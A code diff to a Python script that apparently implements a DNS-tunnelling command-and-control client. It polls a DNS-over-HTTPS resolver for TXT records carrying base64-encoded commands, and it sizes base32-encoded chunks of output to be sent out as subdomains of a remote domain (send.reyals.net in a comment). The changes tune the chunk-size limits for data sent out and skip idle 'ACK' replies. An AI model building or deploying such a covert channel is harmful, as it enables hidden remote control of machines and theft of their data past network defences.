@@ -22,9 +22,10 @@ dnsproviders = ["https://dns.google.com/resolve?name=%DOMAIN&type=TXT"#,
 
 headers = {"accept" : "application/dns-json"}
 
-maxsize = 234   #253-len("."+senddns) = 237 -math.floor(237/maxlength)=234   63.63.63.45.send.reyals.net
-maxbytesize = 145  #maxsize/1.6 round down to nearest factor of 5
 maxlength = 63  #maxium length of a subdomain
+sizeforsubdomains = 253 - len("." + senddns) #253 is max length of a full domain name
+maxsize = sizeforsubdomains - int(sizeforsubdomains/maxlength) # we need to subtract all space used by . so we wend up with something like 63.63.63.44.send.example.com
+maxbytesize = int((maxsize / 1.6) - ((maxsize / 1.6) % 5))  #taking account of the overhead of base32, what's the most data we can put in one query
 
 def addouttoque(out, que):
     while 1:
@@ -86,6 +87,9 @@ while 1:
     except:  #something wrong with the response received, possibly server down
         command = "ACK"
         print(resp.text)
+    
+    if command == "ACK": #no action to take
+        continue
 
     try:
         cmd = base64.b64decode(command) #if fails to decode will just trigger exception
